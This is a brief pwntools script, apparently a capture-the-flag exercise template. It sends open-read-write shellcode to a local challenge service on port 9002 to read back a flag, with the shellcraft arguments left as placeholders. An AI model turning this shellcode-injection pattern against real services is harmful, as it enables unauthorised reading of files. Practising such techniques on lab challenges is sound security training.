from pwn import *
context.arch = 'amd64'
# p = process("./chall2")
p = remote("localhost", 9002) # 假设题目部署在独立端口
shellcode = asm(
    shellcraft.openat(__TODO__) +
    shellcraft.read(__TODO__) +
    shellcraft.write(__TODO__)
)
p.recvuntil(b"bytes):\n")
p.send(shellcode)
p.recvline()
flag = p.recvall(timeout=1)
print(b"Flag: " + flag.strip())